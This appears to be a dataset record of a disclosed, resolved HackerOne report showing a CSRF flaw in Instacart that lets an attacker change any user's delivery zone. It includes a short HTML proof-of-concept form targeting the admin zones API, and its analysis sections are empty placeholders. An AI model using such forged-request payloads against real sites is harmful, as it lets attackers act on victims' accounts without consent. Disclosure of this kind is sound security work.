---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '157993'
original_report_id: '157993'
title: Cross-Site Request Forgery (CSRF)
weakness: Cross-Site Request Forgery (CSRF)
team_handle: instacart
created_at: '2016-08-09T21:52:49.883Z'
disclosed_at: '2016-10-13T20:21:53.860Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 31
tags:
- hackerone
- cross-site-request-forgery-csrf
---

# Cross-Site Request Forgery (CSRF)

## Metadata

- HackerOne Report ID: 157993
- Weakness: Cross-Site Request Forgery (CSRF)
- Program: instacart
- Disclosed At: 2016-10-13T20:21:53.860Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Hello,

i found Cross-Site Request Forgery (CSRF) that can change any user ZONE 

POC:

```
<html>
  <body>
    <form action="https://admin.instacart.com/api/v2/zones" method="POST">
      <input type="hidden" name="zip" value="10001" />
      <input type="hidden" name="override" value="true" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>

```
put Zone you want send the request to any user and you will change his Zone

__Please Watch My POC I Attached For More Details__
Thanks

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
